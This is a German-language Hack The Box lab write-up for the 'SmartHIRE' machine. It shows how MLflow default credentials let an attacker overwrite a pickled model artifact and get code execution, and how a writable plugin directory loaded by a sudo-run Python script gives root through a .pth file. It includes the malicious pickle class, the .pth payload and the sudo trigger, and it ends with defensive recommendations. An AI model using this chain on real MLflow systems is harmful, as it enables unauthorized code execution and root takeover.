# Hack The Box: SmartHIRE Writeup

Flags sind absichtlich nicht enthalten. Dieser Writeup ist public-safe gehalten: keine Flag-Werte, keine privaten Schlüssel und keine unnötigen Secrets.

## Überblick

SmartHIRE war eine Linux-Web-Maschine mit einer Hiring-/ML-Plattform. Die Hauptanwendung erlaubte Benutzerregistrierung, Modelltraining über CSV-Uploads und Resume-Scoring. Der entscheidende Pivot war ein zusätzlicher MLflow-Vhost, über den sich registrierte Modelle und Artefakte manipulieren ließen.

Kurzfassung der Chain:

1. Web-App auf `smarthire.htb` enumerieren.
2. Vhost `models.smarthire.htb` finden.
3. MLflow mit Default Basic-Auth erreichen.
4. Ein Modell über die SmartHIRE-App trainieren.
5. Das MLflow-Artefakt `python_model.pkl` überschreiben.
6. Über `/predict` das manipulierte pyfunc-Modell laden und Code als `svcweb` ausführen.
7. Sudo-Regel für ein Python-Managementscript missbrauchen.
8. Writable Plugin-Verzeichnis + Python `.pth` Verarbeitung für Root-Code-Execution nutzen.

## Recon

Der erste Scan zeigte nur SSH und HTTP:

```text
22/tcp  open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp  open  http  nginx 1.18.0 Ubuntu
```

Port 80 leitete auf den Hostnamen `smarthire.htb` weiter. Die Webanwendung bot eine öffentliche Landingpage, Registrierung und Login.

Nach Registrierung eines normalen Accounts waren weitere Routen sichtbar:

```text
/dashboard
/predict
/model_info
/upload_hiring_data
```

Das Dashboard hatte eine CSV-Uploadfunktion zum Trainieren eines Hiring-Modells. Der Frontend-Code zeigte, dass Trainingsdaten an `/upload_hiring_data` gesendet werden und dass `/model_info` den aktiven Modellnamen zurückgibt.

## Vhost Enumeration

Gezielte Vhost-Enumeration gegen die SmartHIRE-Domain fand einen zweiten Host:

```text
models.smarthire.htb -> 401 Unauthorized
```

Die 401-Antwort enthielt einen MLflow-Hinweis und einen Basic-Auth-Realm:

```text
WWW-Authenticate: Basic realm="mlflow"
```

Mit Default-Credentials war der MLflow-Server erreichbar:

```text
admin:password
```

Die MLflow-Version war:

```text
2.14.1
```

## Foothold

Nach dem Upload einer gültigen Trainings-CSV in SmartHIRE registrierte die Anwendung ein MLflow-Modell. Die Registry lieferte unter anderem:

```text
Model: <user-spezifischer Modellname>
Source: mlflow-artifacts:/0/<run_id>/artifacts/model
```

Die MLflow-Artefakt-API erlaubte Schreibzugriff auf das Modellartefakt. Besonders relevant war:

```text
PUT /api/2.0/mlflow-artifacts/artifacts/0/<run_id>/artifacts/model/python_model.pkl
```

Damit konnte das ursprüngliche `python_model.pkl` durch ein eigenes cloudpickle-serialisiertes pyfunc-Objekt ersetzt werden. Wichtig war, dass das Objekt die Methoden bereitstellt, die MLflow beim Laden und Vorhersagen erwartet:

```python
class Hints:
    input = None
    output = None

class EvilModel:
    def _get_type_hints(self):
        return Hints()

    def load_context(self, context):
        pass

    def predict(self, context, model_input, params=None):
        import subprocess
        out = subprocess.run(
            "id; hostname; pwd",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=20,
        ).stdout
        raise Exception(out)
```

Nach dem Überschreiben des Pickles löste ein POST auf `/predict` das Laden des Modells aus. Dadurch lief Code im Kontext der Webanwendung:

```text
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Damit war der erste Foothold als `svcweb` erreicht.

## Enumeration als svcweb

Die lokale Enumeration zeigte Quellcode und Konfigurationen unter:

```text
/var/www/smarthire.htb/
```

Interessanter war die sudo-Konfiguration für `svcweb`:

```text
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

Das erlaubte Script war ein Python-Managementtool für MLflow. Es lud Plugin-Verzeichnisse dynamisch:

```python
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

Das war interessant, weil Python `site.addsitedir()` nicht nur Pfade hinzufügt, sondern auch `.pth`-Dateien verarbeitet. `.pth`-Dateien können Zeilen ausführen, die mit `import` beginnen.

Die Berechtigungen zeigten ein beschreibbares Plugin-Verzeichnis:

```text
/opt/tools/mlflow_ctl/plugins/dev  drwxrwxr-x root:devs
```

Da `svcweb` Mitglied der Gruppe `devs` war, konnte dort eine `.pth`-Datei geschrieben werden.

## Privilege Escalation

Die Privesc bestand aus drei Bedingungen:

1. `svcweb` darf das Managementscript per sudo als Root ausführen.
2. Das Managementscript ruft `site.addsitedir()` auf Plugin-Verzeichnissen auf.
3. Ein Plugin-Unterverzeichnis ist für die Gruppe `devs` schreibbar.

Eine minimalistische `.pth`-Datei reicht aus, um beim Start des Root-Python-Prozesses Code auszuführen:

```python
import os; os.system("id > /tmp/pth-proof")
```

Auslösen:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Damit wurde der Code als Root ausgeführt. Anschließend konnte die Root-Flag gelesen werden.

## Kill Chain

```text
nmap -> 22,80
HTTP redirect -> smarthire.htb
Register/Login -> dashboard + model training
Vhost fuzzing -> models.smarthire.htb
MLflow Basic Auth -> default admin:password
Train model -> MLflow model + run_id
Overwrite python_model.pkl via MLflow artifact API
/predict -> pyfunc load -> RCE as svcweb
sudo -l -> root NOPASSWD Python management script
site.addsitedir(plugin_dir) + writable dev plugin dir
.pth import execution -> root
```

## Takeaways

- MLflow sollte nie mit Default-Credentials oder schwacher Basic Auth exponiert sein.
- MLflow-Artefakt-Schreibzugriff ist sehr gefährlich, wenn nachgelagerte Anwendungen Modelle automatisch laden.
- Python Pickle/Cloudpickle ist kein sicheres Austauschformat für untrusted Artefakte.
- `site.addsitedir()` verarbeitet `.pth`-Dateien. In Root-Kontexten ist ein schreibbares Site-/Plugin-Verzeichnis daher ein direkter Code-Execution-Pfad.
- Sudo-Regeln mit Wildcards und Python-Tools müssen besonders vorsichtig auditiert werden.

## Empfehlungen

- MLflow mit starken, individuellen Credentials und Netzwerksegmentierung absichern.
- Schreibzugriff auf Modellartefakte strikt trennen von Anwendungen, die Modelle produktiv laden.
- Modelle vor dem Laden signieren oder auf vertrauenswürdige Registry-Pfade beschränken.
- Keine gruppenbeschreibbaren Plugin-Verzeichnisse in Root-ausgeführten Python-Prozessen verwenden.
- Bei sudo-Regeln für Python-Scripte Umgebungs- und Importpfade sowie Plugin-Loader auditieren.

## Lokale Artefakte

Die Arbeitsartefakte lagen lokal unter:

```text
/Users/anderson/htb/10.129.50.174/
```

Wichtige Dateien:

```text
nmap.txt
nmap-allports.txt
gobuster-vhosts.txt
session-summary.md
```
